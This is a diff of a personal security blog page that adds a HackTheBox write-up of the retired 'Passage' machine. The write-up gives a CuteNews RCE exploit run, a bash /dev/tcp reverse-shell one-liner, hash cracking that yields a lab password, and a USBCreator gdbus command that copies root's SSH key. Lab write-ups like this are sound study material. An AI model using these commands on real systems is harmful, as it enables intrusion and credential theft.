@@ -33,10 +33,10 @@
   
     
   
-  <meta name="description" content="Welcome to my personal Security blog!" />
+  <meta name="description" content="Here&#39;s my writeup for the RETIRED machine Passage, Which is a Medium Linux machine!" />
 
   
-  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/test/" />
+  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/writeups/htb-passage/" />
 
   
 
@@ -276,8 +276,6 @@
   
 
   
-    <link rel="alternate" href="/test/index.xml" type="application/rss+xml" title="Mohamed ELLEUCH" />
-  
 
   
     <link rel="manifest" href="/index.webmanifest" />
@@ -286,7 +284,7 @@
   <link rel="icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_32x32_fill_lanczos_center_2.png" />
   <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_180x180_fill_lanczos_center_2.png" />
 
-  <link rel="canonical" href="https://mohamed-elleuch.me/test/" />
+  <link rel="canonical" href="https://mohamed-elleuch.me/writeups/htb-passage/" />
 
   
   
@@ -296,18 +294,23 @@
   
   
     
-    
   
   
-  <meta property="twitter:card" content="summary" />
+  <meta property="twitter:card" content="summary_large_image" />
   
   <meta property="og:site_name" content="Mohamed ELLEUCH" />
-  <meta property="og:url" content="https://mohamed-elleuch.me/test/" />
-  <meta property="og:title" content=" | Mohamed ELLEUCH" />
-  <meta property="og:description" content="Welcome to my personal Security blog!" /><meta property="og:image" content="https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png" />
-    <meta property="twitter:image" content="https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png" /><meta property="og:locale" content="en-us" />
+  <meta property="og:url" content="https://mohamed-elleuch.me/writeups/htb-passage/" />
+  <meta property="og:title" content="HackTheBox - Passage Writeup | Mohamed ELLEUCH" />
+  <meta property="og:description" content="Here&#39;s my writeup for the RETIRED machine Passage, Which is a Medium Linux machine!" /><meta property="og:image" content="https://mohamed-elleuch.me/writeups/htb-passage/featured.png" />
+    <meta property="twitter:image" content="https://mohamed-elleuch.me/writeups/htb-passage/featured.png" /><meta property="og:locale" content="en-us" />
   
     
+      <meta
+        property="article:published_time"
+        content="2021-03-06T00:00:00&#43;00:00"
+      />
+    
+    <meta property="article:modified_time" content="2021-03-06T00:00:00&#43;00:00">
   
 
   
@@ -318,11 +321,13 @@
 
   
 
+  
 
 
 
 
-  <title> | Mohamed ELLEUCH</title>
+
+  <title>HackTheBox - Passage Writeup | Mohamed ELLEUCH</title>
 </head>
 
 
@@ -586,6 +591,204 @@
   </div>
 
   <div class="page-body">
+    <article class="article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+<div class="article-container pt-3">
+  <h1>HackTheBox - Passage Writeup</h1>
+
+  
+  <p class="page-subtitle">Here&rsquo;s my writeup for the RETIRED machine Passage, Which is a Medium Linux machine!</p>
+  
+
+  
+
+
+<div class="article-metadata">
+
+  
+  
+  
+  
+  <div>
+    
+
+  <span class="author-highlighted">
+      Mohamed Elleuch</span>
+  </div>
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+    
+    Mar 6, 2021
+  </span>
+  
+
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  
+
+</div>
+
+  
+
+
+
+
+
+</div>
+
+
+<div class="article-header container featured-image-wrapper mt-4 mb-4" style="max-width: 589px; max-height: 343px;">
+  <div style="position: relative">
+    <img src="/writeups/htb-passage/featured.png" alt="" class="featured-image">
+    <span class="article-header-caption">Image credit: [<strong>HackTheBox</strong>]</span>
+  </div>
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style">
+      <h1 id="p-stylecolorredinformation-gathering-p"><p style="color:RED">Information Gathering </p></h1>
+<h2 id="p-stylecolorgreennmap-scan-p"><p style="color:Green">Nmap scan </p></h2>
+<p><code>rustscan -a 10.10.10.206 -- -A -sC -sV</code></p>
+<pre><code>Open 10.10.10.206:22
+Open 10.10.10.206:80
+</code></pre>
+<pre><code>22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+
+| ssh-hostkey: 
+|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
+|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
+|   256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
+
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Passage News
+
+</code></pre>
+<p> We have two ports open 
+	Port 22 : OpenSSH 7.2p2
+	Port 80 : Apache httpd 2.4.18
+</p>
+<h2 id="p-stylecolorgreenexploring-the-webserver-p"><p style="color:Green">Exploring the WebServer </p></h2>
+<p>Let&rsquo;s first add Passage.htb to our hosts file!</p>
+<p>We can see that Fail2Ban is Implemented on the server! So no need to waste our time trying bruteforcing dirs and files</p>
+<img src="fail2ban.png"> 
+<p>What really catchs my eye is</p>
+<p><code>Powered by CuteNews</code></p>
+<p>A simple search on google can reveal the default dir for CuteNews CMS which is /CuteNews/</p>
+<p>Let&rsquo;s see what we get!
+<img src="cuteCMS.png">
+Nice! We got the CMS version</p>
+<p><code>Powered by CuteNews 2.1.2</code></p>
+<p>Let&rsquo;s find a vulnerability related to this version!</p>
+<h1 id="p-stylecolorredinitial-foothold-p"><p style="color:RED">Initial Foothold </p></h1>
+<p>Let&rsquo;s see what searchsploit has for us!</p>
+<img src="Searchsploit.png">
+<p>Let&rsquo;s grab that juicy RCE python exploit</p>
+<pre><code>searchsploit -m php/webapps/48800.py
+</code></pre>
+<p>And run our script, We only need to provide <b>	http://passage.htb</b></p>
+<pre><code>python3 48800.py
+</code></pre>
+<img src="foothold.png">
+<p>And we&rsquo;re on the box!</p>
+<p>Let&rsquo;s get a proper shell on the box!</p>
+<p><code>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1'</code></p>
+<img src="pwncat.png">
+<h1 id="p-stylecolorreduser-privescp"><p style="color:RED">User Privesc</p></h1>
+<h2 id="p-stylecolorgreenpaul-user-p"><p style="color:Green">Paul user </p></h2>
+<p>Going through the webserver config, I found an interesting directory</p>
+<p><code>/var/www/html/CuteNews/cdata/users</code></p>
+<p>Which seem to contain some juicy encoded informations</p>
+<img src="encoded.png">
+<p>It looks like it&rsquo;s Base64 encoded!
+Let&rsquo;s decode it</p>
+<pre><code>a:1:{s:4:&quot;name&quot;;a:1:{s:5:&quot;admin&quot;;a:8:{s:2:&quot;id&quot;;s:10:&quot;1592483047&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;acl&quot;;s:1:&quot;1&quot;;s:5:&quot;email&quot;;s:17:&quot;nadav@passage.htb&quot;;s:4:&quot;pass&quot;;s:64:&quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592487988&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}
+</code></pre>
+<pre><code>a:1:{s:4:&quot;name&quot;;a:1:{s:10:&quot;paul-coles&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483236&quot;;s:4:&quot;name&quot;;s:10:&quot;paul-coles&quot;;s:3:&quot;acl&quot;;s:1:&quot;2&quot;;s:5:&quot;email&quot;;s:16:&quot;paul@passage.htb&quot;;s:4:&quot;nick&quot;;s:10:&quot;Paul Coles&quot;;s:4:&quot;pass&quot;;s:64:&quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592485556&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}
+</code></pre>
+<p>Seems like we got nadav and paul&rsquo;s hash password</p>
+<p>It&rsquo;s a sha2-256 hash, we&rsquo;re gonna use Hashcat with the rockyou wordlist to crack them!</p>
+<pre><code>echo &quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&quot; &gt; hash 
+echo &quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&quot; &gt; hash
+</code></pre>
+<pre><code>hashcat -m 1400 hash /opt/rockyou.txt
+</code></pre>
+<p>Seems like we were only able to crack paul&rsquo;s hash!</p>
+<img src="cracked.png">
+<p><code>paul:atlanta1</code></p>
+<p>And grab our user flag</p>
+<h2 id="p-stylecolorgreennadav-user-p"><p style="color:Green">Nadav user </p></h2>
+<p>We can notice that nadav can access paul&rsquo;s session</p>
+<img src="ssh.png">
+<p>Let&rsquo;s see if paul&rsquo;s can access nadav&rsquo;s session</p>
+<pre><code>ssh nadav@passage
+</code></pre>
+<img src="nadav.png">
+<p>It worked!</p>
+<h1 id="p-stylecolorredroot-privescp"><p style="color:RED">Root Privesc</p></h1>
+<p>Let&rsquo;s first run</p>
+<pre><code>ps -aux
+</code></pre>
+<p>To see the current running processes!
+<img src="usb.png">
+What really catches me is that root is running, and that&rsquo;s odd</p>
+<pre><code>/usr/bin/python3 /usr/share/usb-creator/usb-creator-helper
+</code></pre>
+<p>A bit a searching/reading from google can lead us to something, which is the ability to get any file we want!</p>
+<pre><code>gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /dev/shm/id_rsa true
+</code></pre>
+<img src="root1.png">
+<p>And we rooted the box!</p>
+<h2 id="thanks-for-reading-hope-you-enjoyed-it">Thanks for reading hope you enjoyed it!</h2>
+
+    </div>
+
     
 
 
@@ -593,7 +796,101 @@
 
 
 
+<div class="article-tags">
   
+  <a class="badge badge-light" href="/tag/hackthebox/">HackTheBox</a>
+  
+</div>
+
+
+
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://twitter.com/intent/tweet?url=https://mohamed-elleuch.me/writeups/htb-passage/&amp;text=HackTheBox%20-%20Passage%20Writeup" target="_blank" rel="noopener" class="share-btn-twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.facebook.com/sharer.php?u=https://mohamed-elleuch.me/writeups/htb-passage/&amp;t=HackTheBox%20-%20Passage%20Writeup" target="_blank" rel="noopener" class="share-btn-facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="mailto:?subject=HackTheBox%20-%20Passage%20Writeup&amp;body=https://mohamed-elleuch.me/writeups/htb-passage/" target="_blank" rel="noopener" class="share-btn-email">
+          <i class="fas fa-envelope"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=https://mohamed-elleuch.me/writeups/htb-passage/&amp;title=HackTheBox%20-%20Passage%20Writeup" target="_blank" rel="noopener" class="share-btn-linkedin">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="whatsapp://send?text=HackTheBox%20-%20Passage%20Writeup%20https://mohamed-elleuch.me/writeups/htb-passage/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+          <i class="fab fa-whatsapp"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://service.weibo.com/share/share.php?url=https://mohamed-elleuch.me/writeups/htb-passage/&amp;title=HackTheBox%20-%20Passage%20Writeup" target="_blank" rel="noopener" class="share-btn-weibo">
+          <i class="fab fa-weibo"></i>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
 
 
 
@@ -602,31 +899,125 @@
 
 
   
+  
+    
+
+
 
   
   
   
     
   
-<div class="universal-wrapper pt-3">
-  <h1></h1>
+  
+  
+  <div class="media author-card content-widget-hr">
+    
+      
+      <a href="https://mohamed-elleuch.me"><img class="avatar mr-3 avatar-circle" src="/authors/admin/avatar_hue00c9bb654a77b295a35ed11380f9182_580950_270x270_fill_q75_lanczos_center.jpg" alt="Mohamed Elleuch"></a>
+    
+
+    <div class="media-body">
+      <h5 class="card-title"><a href="https://mohamed-elleuch.me">Mohamed Elleuch</a></h5>
+      <h6 class="card-subtitle">Cyber Security Enthusiast <br/> ICT Engineering Student</h6>
+      <p class="card-text">Pentester and Red Teamer</p>
+      <ul class="network-icon" aria-hidden="true">
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="/#contact" >
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://twitter.com/medelleuchv1" target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://github.com/ElleuchX1" target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://www.linkedin.com/in/medelleuch" target="_blank" rel="noopener">
+        <i class="fab fa-linkedin"></i>
+      </a>
+    </li>
+  
+</ul>
+
+    </div>
+  </div>
+
 
   
 
-  
-</div>
 
 
 
-<div class="universal-wrapper">
-  
 
-  
-  
 
-  
 
-</div>
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+</article>
   </div>
 
   <div class="page-footer">
